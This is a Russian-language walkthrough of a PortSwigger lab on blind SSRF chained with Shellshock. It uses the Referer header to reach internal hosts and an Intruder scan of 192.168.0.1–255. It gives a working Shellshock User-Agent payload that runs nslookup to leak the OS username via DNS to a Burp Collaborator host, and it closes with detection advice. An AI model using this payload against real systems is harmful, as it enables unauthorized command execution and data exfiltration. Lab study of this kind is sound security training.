# Blind SSRF с Shellshock: эксфильтрация через DNS

**Лаба:** [Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation) (Expert, SSRF)
**Суть:** система аналитики обращается к URL из заголовка `Referer`. Слепой SSRF позволяет добраться до внутреннего сервера, а Shellshock — получить имя пользователя ОС через DNS-запрос.

## Разведка

При загрузке страницы товара сервер обращается к URL из `Referer`. Это видно через Collaborator Everywhere. Сервер также копирует наш User-Agent в исходящий запрос: мы управляем и адресом назначения, и значением этого заголовка.

## Цепочка

1. Генерируем домен Burp Collaborator.
2. В User-Agent передаём Shellshock-пейлоад, который включает имя пользователя в поддомен DNS-запроса:

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

3. `Referer: http://192.168.0.1:8080`, последний октет отправляем в Intruder — Numbers от 1 до 255.
4. Ответа внутреннего сервера мы не видим, поэтому проверяем события кнопкой Poll now в Collaborator. Когда запрос попадёт на хост, где обработка заголовка вызывает уязвимый Bash, тот выполнит `nslookup peter-uxwq0S.burp-collab...`. Имя пользователя будет видно в DNS-запросе.

## Как обнаружить

В этой цепочке внутренний сервер отправляет DNS-запрос с именем пользователя в поддомене. Мониторинг обращений к внешним доменам из внутренних сегментов может помочь обнаружить такую утечку. Сам по себе DNS-запрос ещё не доказывает SSRF: его нужно сопоставлять с запросами к приложению и другими событиями.

## Заметка

Здесь пригодились две проверки: внешние взаимодействия через Collaborator и заголовки, которые приложение копирует в исходящие запросы. Для Shellshock недостаточно старого Bash на сервере: уязвимая оболочка должна вызываться при обработке контролируемых данных. DNS может служить каналом утечки, если разрешены внешние DNS-запросы, даже когда исходящий HTTP заблокирован.
